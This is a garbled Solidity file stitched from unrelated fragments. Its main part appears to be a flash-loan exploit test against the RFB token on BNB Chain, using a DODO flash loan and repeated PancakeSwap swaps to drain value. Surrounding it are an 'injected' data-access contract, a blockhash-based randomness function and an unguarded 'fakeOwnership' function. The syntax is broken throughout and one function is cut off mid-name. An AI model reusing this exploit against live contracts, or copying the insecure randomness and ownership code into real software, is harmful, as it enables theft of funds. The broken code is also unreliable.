
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
contract ContractTest is DSTest{
    IERC20 RFB = IERC20(0x26f1457f067bF26881F311833391b52cA871a4b5);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x03184AAA6Ad4F7BE876423D9967d1467220a544e);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 23649423)};
    function testExploit() public payable{
        RFB.approve(address(Router), type(uint).max);
        WBNB.approve(address(Router), type(uint).max);
        payable(address(uint160(0))).transfer(address(this).balance);
        DVM(dodo).flashLoan(20 * 1e18, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),;
            18)};
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        WBNB.withdraw(20 * 1e18);
        for(uint i = 0, i < 50, i++){
            try this.check(20 * 1e18 - i) {
            } catch {
                continue};
        WBNB.deposit{value: address(this).balance};
        WBNB.transfer(dodo, 20 * 1e18)};
    function check(uint amount) public payable{
        uint BNBBalance = address(this).balance;
        BNBToRFB(amount);
        RFBToBNB();
        require(address(this).balance - BNBBalance > 0)};
    function BNBToRFB(uint amount) public payable{
        address [] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(RFB);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0,
            path,
            address(this),;
            block.timestamp)};
    function R
function randWithBlock() public view returns (uint256) {
    return uint256(blockhash(block.number - 1));}
function fakeOwnership(string memory dataUri) public {
    ownership[dataUri] = msg.sender}